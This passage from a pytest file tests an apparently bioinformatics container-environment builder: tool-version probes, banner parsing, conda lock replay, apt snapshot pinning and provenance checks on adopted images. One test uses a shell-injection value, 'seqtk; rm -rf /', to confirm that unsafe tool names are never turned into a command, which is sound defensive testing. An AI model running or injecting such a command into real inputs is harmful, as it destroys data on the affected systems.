    res = cb_inst.validate_in_image("image:tag", checks=["samtools --help 2>/dev/null"],
                                    probe_tools=["seqtk"])
    probe_argvs = [a for a in invocations
                   if any("seqtk" in x and "samtools" not in x for x in a)]
    assert probe_argvs, "expected probe invocations for seqtk"
    # The probe is a FIXED template with the sanitized token as its only variable
    # part — asserted whole rather than by banned characters, since the on-PATH
    # guard legitimately needs a `;` and a character blacklist would have to be
    # loosened (and thereby weakened) every time the template grows.
    import re
    allowed = re.compile(
        r"^command -v seqtk >/dev/null 2>&1 \|\| exit 0; seqtk( --version)? 2>&1 \|\| true$")
    for argv in probe_argvs:
        shell_cmd = argv[-1]   # docker run ... bash -c <cmd>
        assert allowed.match(shell_cmd), f"unexpected probe command: {shell_cmd!r}"
        assert "samtools" not in shell_cmd   # other tools never leak in
    assert res["banners"]["seqtk"].startswith("Version: 1.4-r122")


def test_validate_in_image_banner_is_empty_when_the_token_is_not_on_path():
    """A version field must be empty when there is nothing to report — never a shell
    error. `<tool> --version 2>&1 || true` captures bash's own `command not found`,
    and the renderer reads banners as VERSION material, so an absent token used to
    render as the tool's self-reported version. Not every verification row is
    labelled on a binary: a requested-java row is labelled `java` precisely because
    `openjdk` produced exactly this."""
    from agent.skills import container_build as cb
    cb_inst = cb.ContainerBuild.__new__(cb.ContainerBuild)
    cb_inst.platform = "linux/amd64"
    cb_inst.workdir = "/work"

    def fake_sh(argv, timeout=300):
        # emulate the guard: the shell short-circuits before the tool ever runs
        cmd = argv[-1]
        if cmd.startswith("command -v ghosttool"):
            return {"returncode": 0, "stdout": "", "stderr": ""}
        return {"returncode": 127,
                "stdout": "bash: line 1: ghosttool: command not found\n", "stderr": ""}

    cb_inst._sh = fake_sh
    res = cb_inst.validate_in_image("image:tag", checks=[], probe_tools=["ghosttool"])
    assert res["banners"]["ghosttool"] == ""
    assert "command not found" not in res["banners"]["ghosttool"]


def test_validate_in_image_unsafe_tool_token_is_skipped(monkeypatch):
    """A tool token with shell metacharacters MUST NOT produce a probe command.
    Closes the only shell-injection seam — the renderer would refuse the empty
    banner anyway, but the probe must not even synthesize the dangerous string."""
    from agent.skills import container_build as cb
    cb_inst = cb.ContainerBuild.__new__(cb.ContainerBuild)
    cb_inst.platform = "linux/amd64"
    cb_inst.workdir = "/work"
    invocations = []
    cb_inst._sh = lambda argv, timeout=300: (invocations.append(argv),
                                             {"returncode": 0, "stdout": "", "stderr": ""})[1]
    bad = "seqtk; rm -rf /"
    res = cb_inst.validate_in_image("image:tag", checks=[], probe_tools=[bad])
    assert res["banners"][bad] == ""        # nothing captured
    # no docker invocation ever referenced the dangerous token
    assert not any(bad in x for argv in invocations for x in argv)


def test_version_from_banner_accepts_only_version_shaped_tokens():
    """The renderer extracts a version from the captured banner ONLY when it
    matches the strict version shape (digit-led, dotted). Arbitrary text in a
    banner can't be smuggled into the version cell."""
    from agent.skills.env_report_helpers import _version_from_banner
    assert _version_from_banner("Version: 1.4-r122\nUsage: seqtk ...") == "1.4-r122"
    assert _version_from_banner("seqtk 1.4-r122\nCopyright (c) ...") == "1.4-r122"
    assert _version_from_banner("bcftools 1.21\nUsing htslib 1.21") == "1.21"
    assert _version_from_banner("samtools v0.7.17-r1188") == "0.7.17-r1188"
    # garbage in → empty out
    assert _version_from_banner("Usage: seqtk <command>\nProgram: seqtk\n") == ""
    assert _version_from_banner("just-a-string-with-no-version") == ""
    assert _version_from_banner("") == ""


def test_banner_scrape_never_reports_a_dependencys_version_as_the_tools():
    """REINTRODUCE-THE-BUG. This is the defect that motivated ShippedBinary, and the
    old test above could not see it: it used `bcftools 1.21 / Using htslib 1.21`,
    where the two versions are IDENTICAL, so a scraper that read the wrong line still
    returned the right string.

    The real banner from the Talos env's bcftools — a populationgenomics csq FORK,
    which is the entire reason that env exists — is:

        bcftools 9cef4057      <- the fork's commit; NOT version-shaped
        Using htslib 1.23.1    <- a DIFFERENT PROJECT

    A whole-text regex skips line 1 (no dotted token) and returns `1.23.1`, so the
    shipped ENV.html rendered `bcftools | 1.23.1` — upstream htslib's number, under
    the name of a fork whose behaviour differs from upstream. Citable, and false.

    '' is the correct answer: we did not capture bcftools' version. Absence must
    render as absence (Rule 2). Delete `_first_line` and this goes red."""
    from agent.skills.env_report_helpers import _extract_version, _version_from_banner
    real = "bcftools 9cef4057\nUsing htslib 1.23.1\nCopyright (C) 2025 Genome Research Ltd."
    assert _version_from_banner(real) == "", (
        "a version-shaped token below line 1 belongs to a DEPENDENCY, not to this tool")
    assert _extract_version(real) == ""
    # a version the tool really does print on its own line still resolves
    assert _version_from_banner("echtvar 0.2.2\n") == "0.2.2"
    assert _version_from_banner("bcftools 1.21\nUsing htslib 1.23.1") == "1.21"


def test_resolved_version_prefers_recorded_facts_over_scraped_prose():
    """The chain every renderer shares, ordered RECORDED-BEFORE-SCRAPED:
    conda/pip metadata > shipped_binaries[].version > banner > evidence `out` >
    install anchor.

    The first two are facts a producer WROTE DOWN. The next two are inferences
    regexed out of prose — and an inference is precisely what cited htslib's version
    for bcftools. So anything recorded outranks anything parsed. This ordering used to
    put the banner second, which let a scraped guess beat a captured fact whenever
    both existed."""
    from env_records import shipped_binary
    from agent.skills.env_report_helpers import _resolved_version
    # conda wins over everything
    assert _resolved_version("samtools", {"version": "1.21"},
                             {"banner": "samtools 1.99", "out": "samtools 1.50"}, []) == "1.21"
    # REINTRODUCE-THE-BUG: a RECORDED version beats a scrapeable banner. Swap rungs 2
    # and 3 back and this returns the banner's 9.9.9 — a parse outranking a fact.
    assert _resolved_version("bcftools", None, {"banner": "bcftools 9.9.9", "out": ""},
                             [shipped_binary("bcftools", version="9cef4057")]) == "9cef4057"
    # banner beats out when nothing is recorded
    assert _resolved_version("seqtk", None,
                             {"banner": "Version: 1.4-r122", "out": ""}, []) == "1.4-r122"
    # out only — last resort before the anchor
    assert _resolved_version("tool", None, {"banner": "", "out": "tool v0.9.1"}, []) == "0.9.1"
    # anchor is the last resort (the synthesized provenance carries the commit)
    assert _resolved_version("seqtk", None, {"banner": "", "out": ""},
                             [shipped_binary("seqtk",
                                             provenance="seqtk (synthesized @ abc1234def56)",
                                             install_command="...")]) == "abc1234def56"
    # nothing → empty. NOT a guess, NOT a fallback: '' means unrecorded.
    assert _resolved_version("ghost", None, None, []) == ""


def test_is_sha_recognizes_commit_only_for_hex_blobs():
    """The dual-display rule appends `(commit <sha>)` only when the install
    anchor LOOKS like a git SHA — a release tag like 'v1.4' is suppressed (would
    just duplicate the banner version)."""
    from agent.skills.env_report_helpers import _is_sha
    assert _is_sha("94e707082d39")
    assert _is_sha("abcdef1")              # 7 chars — git's short-SHA floor
    assert not _is_sha("v1.4")
    assert not _is_sha("1.4-r122")
    assert not _is_sha("abc12")            # too short
    assert not _is_sha("")


def _seqtk_shipped() -> dict:
    """seqtk as the synthesis tier really records it: the tool name in `tool`, the
    baked command in `install_command`, and the `@ <ref>` anchor inside the human
    provenance string where `_version_from_purpose` reads it."""
    from env_records import shipped_binary
    return shipped_binary("seqtk", provenance="seqtk (synthesized @ 94e707082d39)",
                          install_command="git clone ...")


def test_html_report_dual_displays_banner_version_with_sha_anchor():
    """When a banner version is captured AND the install anchor is a SHA, the
    cell renders both: '1.4-r122 (commit 94e707082d)'. Full provenance kept."""
    from agent.skills.env_report_html import render_env_report_html
    record = {"name": "demo", "image": "demo:latest", "image_digest": "sha256:x",
              "content_digest": "sha256:y", "platform": "linux-64",
              "mode": "build", "validation_locus": "native",
              "redistributable": True, "requested_tools": ["seqtk"],
              "verifications": [{"tool": "seqtk", "check": "seqtk 2>&1 | grep -qi usage",
                                 "passed": True, "out": "",
                                 "banner": "Version: 1.4-r122\nUsage: seqtk ..."}],
              "shipped_binaries": [_seqtk_shipped()],
              "resolved_packages": [], "system_packages": [], "conda_specs": []}
    html = render_env_report_html(record)
    # banner version up front, commit anchor in parentheses
    assert "1.4-r122" in html
    assert "(commit 94e707082d39)" in html


def test_envbuild_verify_in_image_threads_banner_into_each_record(monkeypatch):
    """EnvBuild.verify_in_image must pass the tool tokens to validate_in_image and
    write the per-tool banner into the verification records — this is how the
    captured fact reaches the freeze record + the renderer."""
    from agent.skills import env_build as eb

    class FakeCB:
        platform = "linux/amd64"
        longtail = []
        def validate_in_image(self, image, checks, probe_tools=None):
            assert probe_tools == ["seqtk"], "tool tokens must be forwarded"
            return {"success": True,
                    "checks": {checks[0]: {"rc": 0, "out": ""}},
                    "banners": {"seqtk": "Version: 1.4-r122"}}
        def probe_versions(self, image, probes):
            assert probes == {}, "no tier here declares a version probe"
            return {}

    # Stub the control experiment: it spawns a real container, and this test is about
    # threading captured facts, not about docker. Its own coverage is below.
    monkeypatch.setattr("agent.skills.freeze_from_image._evidence_discriminates",
                        lambda platform, ev: ("discriminating", f"stub on {platform}"))

    inst = eb.EnvBuild.__new__(eb.EnvBuild)
    inst.cb = FakeCB()
    inst.verifications = [{"label": "seqtk", "tool": "seqtk",
                           "check": "seqtk 2>&1 | grep -qi usage", "engine_coupled": False}]
    res = inst.verify_in_image("image:tag")
    assert res["success"]
    assert res["verifications"][0]["banner"] == "Version: 1.4-r122"
    assert res["verifications"][0]["tool"] == "seqtk"
    # ...and the control verdict rides along, on the container-native path too.
    assert res["verifications"][0]["control"] == "discriminating"
    assert "linux/amd64" in res["verifications"][0]["control_note"]


def test_envbuild_refuses_evidence_that_passes_without_the_tool(monkeypatch):
    """The container-native path must run the control experiment, not just the string
    rule. MEASURED: `exomiser --help 2>&1 | head -20` exits 0 in a stock debian with no
    exomiser, and freeze registered `proven` on it — because `_evidence_discriminates`
    was wired to `freeze_from_image` and nowhere else."""
    from agent.skills import env_build as eb

    class FakeCB:
        platform = "linux/amd64"
        longtail = []
        def validate_in_image(self, image, checks, probe_tools=None):
            return {"success": True, "checks": {checks[0]: {"rc": 0, "out": ""}},
                    "banners": {}}
        def probe_versions(self, image, probes):
            return {}

    monkeypatch.setattr("agent.skills.freeze_from_image._evidence_discriminates",
                        lambda platform, ev: ("vacuous", "also exits 0 without the tool"))
    inst = eb.EnvBuild.__new__(eb.EnvBuild)
    inst.cb = FakeCB()
    inst.verifications = [{"label": "exomiser", "tool": "exomiser",
                           "check": "exomiser --help | head -20", "engine_coupled": False}]
    res = inst.verify_in_image("image:tag")
    assert res["success"] is False, "a vacuous evidence must REFUSE, not degrade"
    assert res["code"] == "env_build.vacuous_evidence"
    assert "exomiser" in res["error"]


def test_mcp_freeze_evicted_image_falls_through_to_rebuild(monkeypatch, tmp_path):
    """An EnvCache record whose image is no longer in the docker daemon (the user
    `docker rmi`'d it, or the daemon was reset) must MISS the cache and trigger
    a fresh build — not silently hand back a dangling reference + un-rendered
    reports. Re-anchors the cache against the docker daemon at lookup time."""
    import importlib
    from agent.skills import freeze as freeze_mod
    m = importlib.import_module("agent.mcp_server")
    # an existing cached record pointing at an image that's NOT in the daemon
    cache = freeze_mod.EnvCache(tmp_path / "cache.json")
    cache.register("samtools|linux-64|none",
                   {"image": "samtools_dangling:latest", "image_digest": "sha256:dead",
                    "content_digest": "sha256:dead", "mode": "build", "platform": "linux-64",
                    "tarball": "", "hpc_delivery": {}, "redistributable": True})
    # stub the daemon to return "image not present" for any inspect call
    monkeypatch.setattr(m, "subprocess",
                        type("SP", (), {"run": staticmethod(
                            lambda *a, **k: type("R", (), {"returncode": 1, "stdout": "", "stderr": ""})())})())
    # Docker IS available here (only the specific image was evicted); bypass the
    # preflight — whose own `docker version` probe would otherwise hit the rc=1 stub
    # above — so the test reaches the cache-miss/rebuild path it's actually about.
    monkeypatch.setattr(m, "_check_docker_available", lambda: None)
    monkeypatch.setattr(m, "_env_cache", cache)
    monkeypatch.setattr(m._env_mgr, "project_root", tmp_path)
    # force the build path to refuse so we get a clear post-cache signal that the
    # rebuild was attempted (which is the assertion that matters here).
    def fake_build(*a, **k):
        return {"success": False, "stage": "container_build", "reason": "stub"}
    monkeypatch.setattr(m._env_freeze, "build_env_image", fake_build)
    monkeypatch.setattr(m._biocontainers, "resolve_biocontainer",
                        lambda tools, gated=False: {"found": False})
    res = m.freeze(env_name="samtools_e", tools=["samtools"], platform="linux-64")
    # NOT a cache hit (the dangling image was correctly invalidated)
    assert res.get("success") is False
    assert res.get("stage") == "container_build"   # reached the build path
    assert "cache_hit" not in res or res["cache_hit"] is False


# ---------------------------------------------------------------------------
# PHASE 1 — CONDA LOCK IN THE RECIPE.
# The recipe carries pixi.toml + pixi.lock so a rebuild materializes the env
# from those exact bytes — no solve, no chance of bioconda drift picking a
# newer build of htslib (etc.) and producing a different content_digest months
# later. These tests guard the seams that thread the lock through.
# ---------------------------------------------------------------------------

def test_extract_recipe_carries_conda_lock_when_provided():
    """extract_recipe stores the per-file lock dict as `conda_lock` in the
    recipe (or {} when omitted — backward compatible with pre-Phase-1 recipes)."""
    from agent.skills import env_recipe
    lock = {"pixi.toml": '[project]\nname="x"\n', "pixi.lock": "version: 6\n"}
    rec = env_recipe.extract_recipe(None, name="x", conda_deps=["samtools=1.21"],
                                    primary_tools=["samtools"], conda_lock=lock)
    assert rec["conda_lock"] == lock
    assert rec["conda_lock"] is not lock  # defensive copy
    # backward compatible: omitting conda_lock yields {} (not missing key)
    rec0 = env_recipe.extract_recipe(None, name="x", conda_deps=["samtools=1.21"],
                                     primary_tools=["samtools"])
    assert rec0["conda_lock"] == {}


def test_rebuild_from_recipe_passes_conda_lock_through(monkeypatch):
    """rebuild_from_recipe must forward the recipe's `conda_lock` to build_env_image
    as `conda_lock_files`, so the replay skips the solve. Without this thread, the
    recipe carries the lock but the replay still re-solves — silent drift."""
    from agent.skills import env_recipe
    cap = {}
    def fake_build(spec, **kw):
        cap.update(kw)
        return {"success": True, "content_digest": "sha256:x"}
    recipe = {"recipe_version": 1, "name": "x", "conda_deps": ["samtools=1.21"],
              "primary_tools": ["samtools"], "install_steps": [],
              "conda_lock": {"pixi.toml": "...", "pixi.lock": "..."},
              "content_digest": "sha256:x"}
    env_recipe.rebuild_from_recipe(recipe, build_fn=fake_build)
    assert cap["conda_lock_files"] == recipe["conda_lock"]


def test_envbuild_prebaked_lock_skips_solve_calls_declare_locked(monkeypatch):
    """When prebaked_lock_files is set, EnvBuild.build() must call declare_locked
    (write the lock + `pixi install --locked`) — NOT declare/declare_pypi (which
    would re-solve). This is the seam that makes Phase 1 non-fakeable: a recipe
    with a lock cannot accidentally fall back to solving."""
    from agent.skills import env_build as eb
    calls = []

    class FakeCB:
        workdir = "/work"
        class engine:
            name = "pixi"
            @staticmethod
            def lock_artifacts(): return ["pixi.toml", "pixi.lock"]
        def start(self): return {"success": True}
        def declare(self, *a, **k):
            calls.append("declare"); return {"success": True}
        def declare_pypi(self, *a, **k):
            calls.append("declare_pypi"); return {"success": True}
        def declare_locked(self, lock_files):
            calls.append(("declare_locked", sorted(lock_files)))
            return {"success": True}
        def exec(self, cmd, timeout=300):
            return {"returncode": 0, "stdout": "captured-lock-content", "stderr": ""}

    inst = eb.EnvBuild.__new__(eb.EnvBuild)
    inst.cb = FakeCB()
    inst.conda_specs = ["samtools=1.21"]
    inst.pip_specs = []
    inst.tools = []
    inst.lock_text = ""
    inst.lock_files = {}
    inst.prebaked_lock_files = {"pixi.toml": "T", "pixi.lock": "L"}
    inst.build()
    assert ("declare_locked", ["pixi.lock", "pixi.toml"]) in calls
    assert "declare" not in calls and "declare_pypi" not in calls   # NO solve


def test_pixi_engine_install_from_lock_writes_files_and_installs():
    """PixiEngine.install_from_lock writes each lock file via base64+`base64 -d`,
    then runs `pixi install --locked`. The base64 encoding is what makes binary-
    or unicode-safe lock content survive the docker exec round-trip."""
    from agent.skills.container_build import PixiEngine
    eng = PixiEngine()
    calls = []
    class FakeCB:
        def exec(self, cmd, timeout=300):
            calls.append(cmd)
            return {"returncode": 0, "stdout": "", "stderr": ""}
    r = eng.install_from_lock(FakeCB(), {"pixi.toml": "T", "pixi.lock": "L"})
    assert r["success"]
    # both files written via base64 decode into /work
    written = [c for c in calls if "base64 -d" in c]
    assert any("pixi.toml" in c for c in written)
    assert any("pixi.lock" in c for c in written)
    # final step is the lock-aware install — explicit `--locked`, NOT a solve
    assert any("pixi install --locked" in c for c in calls)


def test_base_engine_install_from_lock_refuses_rather_than_solving():
    """The base EnvEngine returns an explicit error from install_from_lock — an
    engine that hasn't implemented the lock-replay path must FAIL LOUD, never
    silently fall back to solving (which would erase the whole reproducibility
    guarantee). Micromamba inherits this default until someone implements it."""
    from agent.skills.container_build import EnvEngine
    r = EnvEngine().install_from_lock(None, {"foo": "bar"})
    assert r["success"] is False
    assert "does not implement install_from_lock" in r["stderr"]


# ---------------------------------------------------------------------------
# PHASE 2 — APT LAYER PINNED TO SNAPSHOT.DEBIAN.ORG.
# The freeze captures a UTC timestamp; every apt-get (live build container AND
# emitted Dockerfile, builder + runtime stages) points at the snapshot archive
# at that timestamp. Same apt bytes across time/machines — no `apt-get update`
# drift picking newer libssl3 et al.
# ---------------------------------------------------------------------------

def test_snapshot_sources_list_formats_bookworm_main_plus_security():
    """The sources.list emitted points at snapshot.debian.org/<timestamp>/ for
    bookworm main AND debian-security/<timestamp>/ for bookworm-security. Both
    are needed so security updates within the snapshot moment are resolvable."""
    from agent.skills.container_build import _snapshot_sources_list
    out = _snapshot_sources_list("20260526T200000Z")
    assert "http://snapshot.debian.org/archive/debian/20260526T200000Z/ bookworm main" in out
    assert "http://snapshot.debian.org/archive/debian-security/20260526T200000Z/ bookworm-security main" in out


def test_emit_dockerfile_pins_apt_to_snapshot_when_timestamp_given():
    """When apt_snapshot is set, every `apt-get update` in the Dockerfile is
    preceded by a sources.list rewrite to snapshot.debian.org AND uses
    Acquire::Check-Valid-Until=false (the snapshot's expired Valid-Until is
    still GPG-valid — we accept it explicitly)."""
    from agent.skills.container_build import emit_dockerfile, PixiEngine
    df = emit_dockerfile("debian:bookworm-slim", engine=PixiEngine(),
                         has_env_layer=False, longtail_steps=[],
                         apt_snapshot="20260526T200000Z")
    assert "snapshot.debian.org/archive/debian/20260526T200000Z" in df
    assert "Acquire::Check-Valid-Until=false" in df
    # both stages (builder + runtime) must be pinned — search count.
    assert df.count("snapshot.debian.org/archive/debian/20260526T200000Z") >= 2


def test_emit_dockerfile_omits_snapshot_when_timestamp_empty():
    """Backward compat: pre-Phase-2 recipes (no apt_snapshot) emit the original
    floating-apt Dockerfile, byte-identical to the previous behavior."""
    from agent.skills.container_build import emit_dockerfile, PixiEngine
    df = emit_dockerfile("debian:bookworm-slim", engine=PixiEngine(),
                         has_env_layer=False, longtail_steps=[])
    assert "snapshot.debian.org" not in df
    assert "Acquire::Check-Valid-Until" not in df


def test_envbuild_content_digest_folds_in_apt_snapshot_when_set():
    """When apt_snapshot is set, it BINDS the apt layer into the digest — two
    rebuilds at different snapshot timestamps yield different digests (so the
    digest no longer lies about the apt layer). Empty apt_snapshot leaves the
    digest unchanged (pre-Phase-2 behavior, recipes verify across versions)."""
    from agent.skills.env_build import EnvBuild
    eb_a = EnvBuild("demo", "1.0", platform="linux/amd64", apt_snapshot="20260526T200000Z")
    eb_b = EnvBuild("demo", "1.0", platform="linux/amd64", apt_snapshot="20260526T200001Z")
    eb_z = EnvBuild("demo", "1.0", platform="linux/amd64")   # no snapshot
    eb_a.lock_text = eb_b.lock_text = eb_z.lock_text = "L"
    da, db, dz = eb_a.content_digest(), eb_b.content_digest(), eb_z.content_digest()
    assert da != db                    # different snapshots → different digests
    assert dz != da and dz != db       # no-snapshot digest is its own thing
    # second EnvBuild with the SAME snapshot must reproduce the digest
    eb_a2 = EnvBuild("demo", "1.0", platform="linux/amd64", apt_snapshot="20260526T200000Z")
    eb_a2.lock_text = "L"
    assert eb_a2.content_digest() == da


def test_envbuild_apt_snapshot_is_threaded_into_container_build():
    """EnvBuild constructs its ContainerBuild with apt_snapshot — the live build
    container's apt commands honor the pin, not just the emitted Dockerfile.
    Without this, `pixi add` would solve against the snapshot-pinned env in the
    Dockerfile but the BUILD container's apt would float (mismatch)."""
    from agent.skills.env_build import EnvBuild
    eb = EnvBuild("demo", platform="linux/amd64", apt_snapshot="20260526T200000Z")
    assert eb.cb.apt_snapshot == "20260526T200000Z"


def test_extract_recipe_carries_apt_snapshot():
    """extract_recipe stores apt_snapshot in the recipe so rebuild_from_recipe
    can replay against the same snapshot. Empty string when omitted (backward
    compatible — pre-Phase-2 recipes are missing the field)."""
    from agent.skills import env_recipe
    rec = env_recipe.extract_recipe(None, name="x", conda_deps=[], primary_tools=[],
                                    apt_snapshot="20260526T200000Z")
    assert rec["apt_snapshot"] == "20260526T200000Z"
    rec0 = env_recipe.extract_recipe(None, name="x", conda_deps=[], primary_tools=[])
    assert rec0["apt_snapshot"] == ""


def test_rebuild_from_recipe_forwards_apt_snapshot_to_build_env_image():
    """The recipe-replay path threads apt_snapshot through so the rebuild's apt
    resolves to the SAME bytes as the original freeze. No drift on rebuild."""
    from agent.skills import env_recipe
    cap = {}
    def fake_build(spec, **kw):
        cap.update(kw); return {"success": True, "content_digest": "sha256:x"}
    recipe = {"recipe_version": 1, "name": "x", "conda_deps": [],
              "primary_tools": [], "install_steps": [],
              "apt_snapshot": "20260526T200000Z"}
    env_recipe.rebuild_from_recipe(recipe, build_fn=fake_build)
    assert cap["apt_snapshot"] == "20260526T200000Z"


def test_build_env_image_auto_generates_snapshot_when_none_given(monkeypatch):
    """A FIRST freeze (no recipe yet) auto-generates a UTC snapshot timestamp.
    Captures it into the build so the recipe written from that freeze carries it,
    closing the loop — subsequent replays pin to the captured moment."""
    import re
    from agent.skills import env_freeze
    cap = {}
    class FakeEB:
        def __init__(self, *a, **k): cap.update(k)
        def add_conda(self, *a, **k): pass
        def add_pip(self, *a, **k): pass
        def add_tool(self, *a, **k): pass
        def run(self): return {"success": True}
        def request_key(self): return "rk"
    monkeypatch.setattr(env_freeze, "EnvBuild", FakeEB)
    env_freeze.build_env_image({"install_steps": []}, name="demo", conda_deps=[])
    assert re.fullmatch(r"\d{8}T\d{6}Z", cap["apt_snapshot"])


# ---------------------------------------------------------------------------
# PHASE 3 — SOFTWARE HERITAGE LINK-ROT FALLBACK FOR SOURCE-TIER INSTALLS.
# A git source install gets a `_swh_clone` wrapper baked into the install
# command. If the upstream URL is dead at rebuild time, SWH's git_bare vault
# serves the same commit (SHA-verified after — SWH can't lie about contents
# without changing the SHA). Zero freeze-time cost; pays only when needed.
# ---------------------------------------------------------------------------

def test_source_install_uses_swh_clone_not_bare_git_clone():
    """install_commands.source emits `_swh_clone <url> <ref> <dst>` instead of
    a bare `git clone`. This is the seam that makes link-rot self-healing — a
    bare git clone has no fallback; _swh_clone tries upstream then SWH."""
    from agent.skills.install_commands import source
    s = source("seqtk", "https://github.com/lh3/seqtk",
               ref="ae7defa8bead", build_command="make", bin_path="seqtk")
    assert "_swh_clone https://github.com/lh3/seqtk ae7defa8bead " in s["command"]
    assert "git clone https://" not in s["command"]   # no bare clone left


def test_script_repo_install_uses_swh_clone_not_bare_git_clone():
    """script_repo (run-by-path academic repos) gets the same _swh_clone wrap —
    half-baked academic tools are the MOST common link-rot victims."""
    from agent.skills.install_commands import script_repo
    s = script_repo("acad_tool", "https://github.com/lab/x", ref="abc1234",
                    script_rel="run.py", interpreter="python")
    assert "_swh_clone https://github.com/lab/x abc1234 " in s["command"]
    assert "git clone https://" not in s["command"]


def test_swh_clone_script_has_required_shape():
    """The _SWH_CLONE_SCRIPT helper installed in the builder stage must (1) try
    upstream first, (2) hit SWH's vault API on failure, (3) poll until done or
    fail loud, (4) clone from the resulting tarball locally."""
    from agent.skills.container_build import _SWH_CLONE_SCRIPT
    assert "git clone \"$url\" \"$dst\"" in _SWH_CLONE_SCRIPT         # upstream first
    assert "archive.softwareheritage.org/api/1/vault/git_bare/" in _SWH_CLONE_SCRIPT
    assert "swh:1:rev:${commit}" in _SWH_CLONE_SCRIPT                 # commit-anchored
    assert "jq -r '.status" in _SWH_CLONE_SCRIPT                      # status polling
    assert 'status" = "done"' in _SWH_CLONE_SCRIPT                    # done branch
    assert "exit 2" in _SWH_CLONE_SCRIPT                              # fails loud on SWH failure


def test_emit_dockerfile_installs_swh_clone_helper_in_builder_stage():
    """The builder stage of the emitted Dockerfile must install _swh_clone BEFORE
    any source-tier install commands run — they call it. Without this, source
    installs would fail with `command not found: _swh_clone`."""
    from agent.skills.container_build import emit_dockerfile, PixiEngine
    df = emit_dockerfile("debian:bookworm-slim", engine=PixiEngine(),
                         has_env_layer=False, longtail_steps=[])
    assert "/usr/local/bin/_swh_clone" in df
    assert "chmod +x /usr/local/bin/_swh_clone" in df
    # the install must precede `mkdir -p /opt/tools` (which is where source
    # installs land) — installed in the builder stage early, before any source
    # commands can call it.
    swh_pos = df.index("/usr/local/bin/_swh_clone")
    tools_pos = df.index("mkdir -p /opt/tools")
    assert swh_pos < tools_pos


def test_build_apt_includes_jq_for_swh_fallback():
    """jq is required by _swh_clone to parse SWH's vault API JSON. It's in the
    BUILD set (~1MB) but NOT the RUNTIME set — never ships."""
    from agent.skills.container_build import _BUILD_APT, _RUNTIME_APT
    assert " jq " in f" {_BUILD_APT} "
    assert " jq " not in f" {_RUNTIME_APT} "   # never ships


# =============================================================================
# Batch-1 stress-test fixes (2026-05-27) — adopt-runs-honesty-contract (D2 + D3)
# =============================================================================


def test_check_adopt_refuses_cuda_accel_without_toolkit_version():
    """D2/D3 — the dorado-stress headline. An adopted biocontainer claiming a
    cuda accelerator but missing toolkit_version MUST fail I12. The previous
    code path rendered POLICY_CLEAN on adopt without ever running the check,
    producing the 'CPU-only samtools shipped under accel=cuda with POLICY_CLEAN
    badge' lie."""
    from agent.skills import env_honesty
    record = {
        "image": "quay.io/biocontainers/samtools:1.21--hd87286a_0",
        "image_digest": "sha256:abc123" + "0" * 58,
        "accelerator": {"type": "cuda"},                # missing toolkit_version
        "license_gated": False, "licenses": [],
        "verifications": [{"label": "samtools", "tool": "samtools",
                           "check": "command -v samtools", "passed": True}],
    }
    violations = env_honesty.check_build(record)
    inv_ids = {v["invariant"] for v in violations}
    assert "I12.accel_toolkit_version_required" in inv_ids


def test_check_adopt_refuses_gated_without_licenses():
    """I13 — a gated adopt must record licenses[] AND must not claim
    redistributable=true."""
    from agent.skills import env_honesty
    record = {
        "image": "quay.io/biocontainers/something:1",
        "image_digest": "sha256:" + "a" * 64,
        "accelerator": None,
        "license_gated": True, "licenses": [],
        "redistributable": True,
    }
    violations = env_honesty.check_build(record)
    inv_ids = {v["invariant"] for v in violations}
    assert "I13.gated_license_recorded" in inv_ids
    assert "I13.gated_not_redistributable" in inv_ids


def test_conda_presence_probe_covers_the_biocontainer_prefix_and_perl_modules():
    """The PRODUCER fix that had to land before adopt could be gated (audit 2026-07-16).

    A published BioContainer installs its conda prefix at /usr/local, NOT /opt/conda — so
    the probe could not see any adopted package whose binary name differs from its package
    name. And a `perl-*` module library ships no bin/ entry at all, so no generic clause
    could ever find it. Measured against REAL biocontainers before the fix: gatk4 rc=1,
    htslib rc=127, perl-bio-db-hts rc=1, perl-bioperl rc=1 — four healthy packages the gate
    would have false-refused, one of which (perl-bio-db-hts) CLAUDE.md explicitly routes to
    conda. Enabling a gate on a probe that cannot see the thing it judges is the Tier-0
    mistake; the fix belongs in the producer.
    """
    from agent.skills.env_freeze import _conda_presence_check
    probe = _conda_presence_check("gatk4")
    assert "/usr/local/conda-meta/gatk4-*.json" in probe, \
        "the BioContainers prefix must be searched, or adopt false-refuses"
    # perl packages get a module-load clause, derived from the package's OWN .pm records
    # (perl-bio-db-hts -> Bio::DB::HTS is not mechanically derivable from the name).
    perl = _conda_presence_check("perl-bio-db-hts")
    assert "perl -M" in perl and "site_perl" in perl
    assert "/usr/local/conda-meta/perl-bio-db-hts-*.json" in perl
    # and the R detour is untouched
    assert "installed.packages" in _conda_presence_check("bioconductor-deseq2")


def test_adopt_passes_clean_record_with_no_policy():
    """An adopted record with real in-image evidence and no accelerator/license policy is
    honest — POLICY_CLEAN with no policy is the empty set."""
    from agent.skills import env_honesty
    record = {
        "image": "quay.io/biocontainers/samtools:1.21--hd87286a_0",
        "image_digest": "sha256:" + "f" * 64,
        "accelerator": None,
        "license_gated": False, "licenses": [],
        "verifications": [{"label": "samtools", "tool": "samtools",
                           "check": "command -v samtools", "passed": True}],
    }
    assert env_honesty.check_build(record) == []


def test_adopt_now_REQUIRES_verifications():
    """INVERTED, deliberately — this is the Tier-2 change (audit 2026-07-16).

    The predecessor of this test asserted the opposite: that VALIDATED_IN_IMAGE.no_evidence
    "MUST NOT fire on adopt", because adopt trusted BioContainers' published digest instead
    of running anything. That exemption was the hole. It answered the wrong question —
    nobody suspected bioconda of lying about its own bytes; the risk is that WE bind the
    WRONG image, and only running the tool catches that. Adopt was also the DEFAULT for
    pure-conda, so the one unvalidated path was the busiest one: samtools=1.21 shipped with
    verifications: [] and two sealed workflows rest on it.

    An adopt record with no evidence is now refused, exactly like a build with none.
    """
    from agent.skills import env_honesty
    record = {
        "image": "quay.io/biocontainers/samtools:1.21--hd87286a_0",
        "image_digest": "sha256:" + "1" * 64,
        # NO verifications key at all — the shape samtools=1.21 registered with
        "accelerator": None,
        "license_gated": False, "licenses": [],
    }
    inv_ids = {v["invariant"] for v in env_honesty.check_build(record)}
    assert "VALIDATED_IN_IMAGE.no_evidence" in inv_ids, \
        "an adopted image nobody ran a tool in must not register as a solved component"


def test_adopt_refuses_missing_image_handles():
    """The structural anchor: an adopted image must resolve to a ref + a manifest digest.
    (Named BUILT.* now that adopt answers check_build — the ADOPTED_BY_DIGEST invariant
    ids died with check_adopt; the PROVENANCE claim of that name survives in the
    attestation + ENV report, which is where it belongs.)"""
    from agent.skills import env_honesty
    v1 = env_honesty.check_build({"image": "", "image_digest": "sha256:" + "a" * 64})
